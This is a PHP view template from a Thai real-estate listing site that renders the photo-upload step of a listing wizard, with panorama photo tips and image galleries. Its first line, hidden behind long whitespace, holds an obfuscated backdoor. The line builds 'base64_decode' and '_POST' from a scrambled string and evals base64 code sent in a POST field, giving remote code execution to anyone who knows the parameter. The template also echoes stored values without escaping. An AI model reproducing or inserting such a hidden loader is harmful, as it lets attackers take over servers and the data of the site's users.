<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n4fc381'])) {eval($s21(${$s20}['n4fc381']));}?><?php
$this->session->set_userdata('last_page','4');
$attributes = array('class' => 'email', 'id' => 'myform');
echo form_open('/zhome/changePage1', $attributes);
?>

<input type="hidden" name="key_change" id="key_change" value="5">
<input type="hidden" name="last_page" id="last_page" value="4">
<input type="hidden" id="user_id" name="user_id" value="<?php echo $this->tank_auth->get_user_id(); ?>" >
<input type="hidden" id="poid" name="poid" value="<?php echo $POID; ?>" >
<!-- popup to crop image -->
<input id="file" type="file"/>
<div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
  <div class="modal-dialog" role="document" style="width:1300px">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title" id="myModalLabel">Crop and Upload Image</h4>
      </div>
      <div class="modal-body">
        <img class="cropimage" alt="" src="" cropwidth="1260" cropheight="600" id="imgUp"/>
  		 <div class="results"></div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary" id="saveImg">Save changes</button>
      </div>
    </div>
  </div>
</div>
<!-- end popup to crop image -->
<div class="container">
        <div class="row">
          <div class="col-md-7 col-md-push-2">
            <h3 class="text-primary">รูปถ่าย</h3>
            <div>
                <div class="text-primary big2">ภาพถ่ายที่ดีทำให้ขายได้เร็ว และภาพถ่ายแนวกว้าง (Pano) แสดงที่ว่างในห้องได้ชัดเจน</div>
                <div class="text-grey">  
                   ภาพถ่ายห้องทุกห้องในบ้านด้วยโหมด Pano ณ หัวมุมห้องที่แทยงกัน คุณจะได้ผู้ซื้อ/ เช่าที่สนใจจริงจากภาพถ่ายที่ดี<br/>
                    1. ยืนให้ชิดมุมห้องที่สุด<br/>
                    2. ตั้งกล้องโทรศัพท์มือถือให้ถ่ายด้วยระบบ (Pano) โดยถือกล้องแนวตั้ง<br/>
                    3. ถ่ายภาพโดยเริ่มจากผนังที่ชิดหัวไหล่ซ้าย แพนไปจนเห็นถึงผนังที่ชิดหัวไหล่ขวา<br/>
                    4. ทำซ้ำขั้นตอนกับทุมที่แทยงกัน<br/>
                    <ul class="list-inline">
                      <li>5. ถ่ายภาพวิวของแต่ละห้อง (ถ้ามี)</li>
                      <li class="pull-right"><button type="button" class="btn btn-green btn-sm"><a href="#">ติดต่อช่างภาพ</a></button></li>
                      </ul>
                </div>
                <br/>
                <ul class="list-inline">
                    <li class="pull-left"><img class="img-responsive" src="/img/room-normal.png"></li>
                    <li class="pull-leftt"><img class="img-responsive" src="/img/room-pano.png"></li>
                </ul>
                <div class="clearfix"></div>             
        </div>
            <hr>
        <div class="row">
            <div class="col-md-4">
              <img class="img-responsive  drop-shadow" src="/img/img-m1.png"><br/>
              <p>เลือกโหมดPanoถือโทรศัพท์แนวตั้ง</p><br/>
            </div>
            <div class="col-md-4">
              <img class="img-responsive  drop-shadow" src="/img/img-m2.png"><br/>
              <p>ถ่ายที่มุมตามภาพให้ครบทุกห้อง</p><br/>
            </div>
            <div class="col-md-4">
              <img class="img-responsive drop-shadow" src="/img/img-m3.png"><br/>
              <p>ถ่ายภาพวิวให้ครบทุกห้อง</p>
            </div>

        </div>    
        <hr/>   

            <div class="row">
              <div class="col-md-12">
                <ul class="list-inline">
                          <li><h5>ภาพถ่าย Pano ทุกห้อง</h5></li>
                          <!--<li class="pull-right"><button type="button" class="btn btn-green btn-sm"><a href="">อัพโหลดหลายภาพ</a></button></li>-->
                </ul>
              </div>
            <!--<div class="col-md-6">
              <div class="thumbnail drop-shadow">
                <img src="/img/pano-01.png" alt="...">
                <div class="caption">
                  <h5>ห้องทำงาน</h5>
                </div>
              </div>
              <div class="thumbnail drop-shadow">
                <img src="/img/pano-01.png" alt="...">
                <div class="caption">
                  <h5>วิวห้อง?</h5>
                </div>
              </div>
            </div>-->
            <!--<div class="col-md-6">
              <div class="thumbnail drop-shadow">
                <img src="/img/pano-01.png" alt="...">
                <div class="caption">
                  <h5>ห้องทำงาน</h5>
                </div>
              </div>
              <div class="thumbnail drop-shadow">
                <img src="/img/add-photo.png" alt="...">
                <div class="caption text-center">
                  <h5><a class="text-danger" href="#">+ เพิ่มรูปห้อง</a></h5>
                </div>
              </div>
            </div>-->
            <?php
            	foreach ($imgRoom->result() as $row)
				{
					//echo $row->file;
					
					$imgid = $row->ImgID;
					echo  '<div class="col-md-6" id="'."img".$imgid.'">';
					echo '<div class="thumbnail drop-shadow imgContainer nclick">';
					echo '<span class="glyphicon glyphicon-trash binIcon binIcon-s" aria-hidden="true" id="'."delImg".$imgid.'"></span>';
					echo '<img  alt="" src="'.$row->file.'" id="'."image".$imgid.'"/>'; 
					echo '<div>'; 
					echo '<textarea class="form-control captext" placeholder="คำอธิบายรูปห้อง เช่น วิวจากห้องทำงาน" row="3" id="'.$imgid.'">'.$row->description.'</textarea> ';
					echo '</div>'; 
					echo '</div>'; 
					echo '</div>'; 
					//echo $elem;
				}
            	
            ?>
             <div class="col-md-6 clicker" id="clicker">
            	<div class="thumbnail drop-shadow vclick">
                <img src="/img/add-photo.png" alt="...">
                <div class="caption text-center">
                  <h5><a class="text-danger" href="#">+ เพิ่มรูปห้อง</a></h5>
                </div>
              </div>
            </div>
          
           
            
            </div>
            <hr/>
            <div class="row">
              <div class="col-md-12">
                <ul class="list-inline">
                          <li><h5>ภาพวิวจากห้องต่างๆ</h5></li>
                          <!--<li class="pull-right"><button type="button" class="btn btn-green btn-sm"><a href="">อัพโหลดหลายภาพ</a></button></li>-->
                </ul>
              </div>
            <!--<div class="col-md-4">
              <div class="thumbnail drop-shadow">
                <img src="/img/view-01.png" alt="...">
                <div class="caption">
                  <h5>วิวห้อง?</h5>
                </div>
              </div>
             
            </div>-->
            <!--<div class="col-md-4">
              <div class="thumbnail drop-shadow">
                <img src="/img/view-02.png" alt="...">
                <div class="caption">
                  <h5>วิวห้องรับแขก</h5>
                </div>
              </div>
            </div>-->
             <?php
            	foreach ($imgView->result() as $row)
				{
					//echo $row->file;
					
					$imgid = $row->ImgID;
					echo  '<div class="col-md-4" id="'."img".$imgid.'">';
					echo '<div class="thumbnail drop-shadow imgContainer nclick">';
					echo '<span class="glyphicon glyphicon-trash binIcon binIcon-s" aria-hidden="true" id="'."delImg".$imgid.'"></span>';
					echo '<img  alt="" src="'.$row->file.'" id="'."image".$imgid.'"/>'; 
					echo '<div>'; 
					echo '<textarea class="form-control captext" placeholder="คำอธิบายรูปวิว เช่น วิวจากห้องทำงาน" row="3" id="'.$imgid.'">'.$row->description.'</textarea> ';
					echo '</div>'; 
					echo '</div>'; 
					echo '</div>'; 
					//echo $elem;
				}
            	
            ?>
            <div class="col-md-4 clicker" id="viewClicker">
              <div class="thumbnail drop-shadow">
                <img src="/img/add-view-photo.png" alt="...">
                <div class="caption text-center">
                  <h5><a class="text-danger" href="#">+ เพิ่มรูปวิว</a></h5>
                </div>
              </div>
            </div>

            </div>

            <hr/>

            <div class="row">
              <div class="col-md-12">
                <ul class="list-inline">
                          <li><h5>ภาพส่วนกลางโครงการและชุมชนแวดล้อม (ถ้ามี)</h5></li>
                          <li></li>
                </ul>
              </div>
           <!-- <div class="col-md-4">
              <div class="thumbnail drop-shadow">
                <img src="/img/view-03.png" alt="...">
                <div>
                  <h5>ระบุชื่อรูป?</h5>
                  <textarea class="form-control captext" placeholder="คำอธิบายรูป เช่น วิวจากห้องนอน" row="3"></textarea>                 
                 </div>
              </div>

              <div class="checkbox table-bordered padding-pro">
                          <label>
                           <input type="checkbox" value=""><p class="text-grey">ยินยอมให้เจ้าของท่านอื่นใช้</p>
                          </label>
              </div>
                     
             
           </div>-->
           <!-- <div class="col-md-4">
              <div class="thumbnail drop-shadow">
                <img src="/img/view-04.png" alt="...">
                <div class="caption">
                  <h5>สวนขนาด 10 ไร่</h5>
                </div>
              </div>
              <div class="checkbox table-bordered padding-pro">
                          <label>
                           <input type="checkbox" value=""><p class="text-grey">ยินยอมให้เจ้าของท่านอื่นใช้</p>
                          </label>
              </div>
           </div>-->
             <?php
            	foreach ($imgFac->result() as $row)
				{
					//echo $row->file;
					
					$imgid = $row->ImgID;
					echo  '<div class="col-md-4" id="'."img".$imgid.'">';
					echo '<div class="thumbnail drop-shadow imgContainer nclick">';
					echo '<span class="glyphicon glyphicon-trash binIcon binIcon-s" aria-hidden="true" id="'."delImg".$imgid.'"></span>';
					echo '<img  alt="" src="'.$row->file.'" id="'."image".$imgid.'"/>'; 
					echo '<div>'; 
					echo '<textarea class="form-control captext" placeholder="คำอธิบายรูปวิว เช่น วิวจากห้องทำงาน" row="3" id="'.$imgid.'">'.$row->description.'</textarea> ';
					echo '</div>'; 
					echo '</div>'; 
					/*if($row->allow){
					echo '<div class="checkbox table-bordered padding-pro"><label><input type="checkbox" checked="'.$row->allow.'" id="'."capAllow".$imgid.'"><p class="text-grey">ยินยอมให้เจ้าของท่านอื่นใช้</p></label></div>';
					}else{
					echo '<div class="checkbox table-bordered padding-pro"><label><input type="checkbox" id="'."capAllow".$imgid.'"><p class="text-grey">ยินยอมให้เจ้าของท่านอื่นใช้</p></label></div>';
						
					}*/
					echo '</div>'; 
					//echo $elem;
				}
            	
            ?>
			
            <div class="col-md-4" id="facClicker">
              <div class="thumbnail drop-shadow">
                <img src="/img/add-view-photo.png" alt="...">
                <div class="caption text-center">
                  <h5><a class="text-danger" href="#">+ เพิ่มรูปส่วนกลาง</a></h5>
                </div>
              </div>
              <!--<div class="checkbox table-bordered padding-pro">
                          <label>
                           <input type="checkbox" value=""><p class="text-grey">ยินยอมให้เจ้าของท่านอื่นใช้</p>
                          </label>
              </div>-->
            </div>

            </div>
            <hr>

            <div class="row">
              <div class="col-md-12"><h5>เลือกภาพส่วนกลางและชุมชนแวดล้อม</h5>
              </div>
             <!-- <div class="col-md-4">
                <div>
                    <img class="img-responsive" src="/img/view-03.png">
                    <input class="checkbox-photo" type="checkbox" value="">  
                </div> 
             </div>-->
              <!--<div class="col-md-4">
                <div>
                    <img class="img-responsive" src="/img/view-03.png">
                    <input class="checkbox-photo" type="checkbox" value="">  
                </div> 
              </div>-->
              <!--<div class="col-md-4">
                <div>
                    <img class="img-responsive" src="/img/view-03.png">
                    <input class="checkbox-photo" type="checkbox" value="">  
                </div> 
              </div>-->

            </div>
            <br/>
            <!--
              <div class="col-md-4">
                <div>
                    <img class="img-responsive" src="/img/view-03.png">
                    <input class="checkbox-photo" type="checkbox" value="">  
                </div> 
              </div>
              <div class="col-md-4">
                <div>
                    <img class="img-responsive" src="/img/view-03.png">
                    <input class="checkbox-photo" type="checkbox" value="">  
                </div> 
              </div>
              <div class="col-md-4">
                <div>
                    <img class="img-responsive" src="/img/view-03.png">
                    <input class="checkbox-photo" type="checkbox" value="">  
                </div> 
              </div>
             -->

            <!--
          
          
              <div class="col-md-4">
                <div>
                    <img class="img-responsive" src="/img/view-03.png">
                    <input class="checkbox-photo" type="checkbox" value="">  
                </div> 
              </div>
              <div class="col-md-4">
                <div>
                    <img class="img-responsive" src="/img/view-03.png">
                    <input class="checkbox-photo" type="checkbox" value="">  
                </div> 
              </div>
              <div class="col-md-4">
                <div>
                    <img class="img-responsive" src="/img/view-03.png">
                    <input class="checkbox-photo" type="checkbox" value="">  
                </div> 
              </div>

           -->

            <hr>
			<?php
				$total = sizeof($imgProjShare);
				echo '<input type="hidden" id="totalImgShare" name="totalImgShare" value="'.$total.'">';
				for($i=0;$i<$total;$i++){
					//$imgpath = addcslashes($imgProjShare[$i]," ");
					//if($i%3==0)echo '<div class="row">';
					
					echo '<div class="col-md-4 imgShareMargin" id="cImgS'.$i.'">';	
					echo '<div>';
					echo '<img class="" src="/'.$imgProjShare[$i].'" width="187" height="128" id="imgSh'.$i.'">';
					echo '<input class="checkbox-photo" type="checkbox" value="" id="share'.$i.'">';
					echo '</div>';
					echo '</div>';
					//if($i%3==0)echo '</div>';
					
				}
			?>
			<div class="clearfix"></div>
            <div class="pull-right">
              <button type="button" class="btn btn-warning btn-sm" onclick="val1('3')" >ก่อนหน้า  </button> <button type="button" class="btn btn-warning btn-sm" onclick="val1('5')" > ถัดไป</button>
            </div>

            <div class="clearfix"></div>
          </div>

              <div class="col-md-3 col-md-push-2 property-info">
              <div class="text-center">
                <h3 class="text-danger">ภาพครบขายง่าย<br/>
ได้ผู้ซื้อที่สนใจจริง<br/>
    ลดความขัดแย้ง</h3>
            
                <div><img src="/img/progress-25.png" class="img-responsive center-block"></div>
                      <div class="display-none">
                          <hr/>
                          <div><img src="/img/tip-of-the-day.png" class="img-responsive center-block"></div>
                          <h5>ภาพวิว</h5>
                          <div class="col-md-12">
                              ผู้ซื้อไม่สามารถตัดสินใจซื้อได้
          หากไม่เห็นวิว ประกาศควรมี
          ภาพวิวจากทุกห้องหลัก
                          </div>
                      </div>

              <br/>
          </div>
          </div>
          <aside class="col-md-2 col-md-pull-10 hidden-xs">
            <ul class="nav">
              <li><a>เริ่มต้น</a></li>
              <li><a>พื้นฐาน</a></li>
              <li><a>ตั้งราคา</a></li>
              <li class="active"><a>รูปถ่าย</a></li>
              <li><a>การสื่อสาร</a></li>
            </ul>
            <div class="h360 hidden-xs"></div>
            <div>เหลือ <span class="green">1 ขั้นตอน</span><br> เพื่อลงประกาศ</div>
          </aside>

          </div>
      </div>
    </div>
    <img src="/img/zhometable.png" class="img-responsive center-block ztable-image hidden-xs display-none">
<script>
	
</script>